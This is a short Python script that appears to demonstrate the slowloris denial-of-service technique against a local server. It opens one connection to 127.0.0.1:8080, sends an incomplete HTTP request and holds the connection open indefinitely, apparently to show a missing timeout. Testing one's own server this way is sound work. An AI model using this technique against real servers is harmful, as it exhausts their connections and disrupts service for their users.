#!/usr/bin/env python3
import socket
import time

def trigger_slowloris():
    print("1. Opening a connection to the server...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 8080))
    
    print("2. Sending a partial request (no \\r\\n\\r\\n)...")
    s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\n")
    
    print("3. Going to sleep forever. Your server will keep my FD open indefinitely.")
    print("   (Press Ctrl+C to kill me)")
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        s.close()
        print("\nClosed.")

if __name__ == "__main__":
    trigger_slowloris()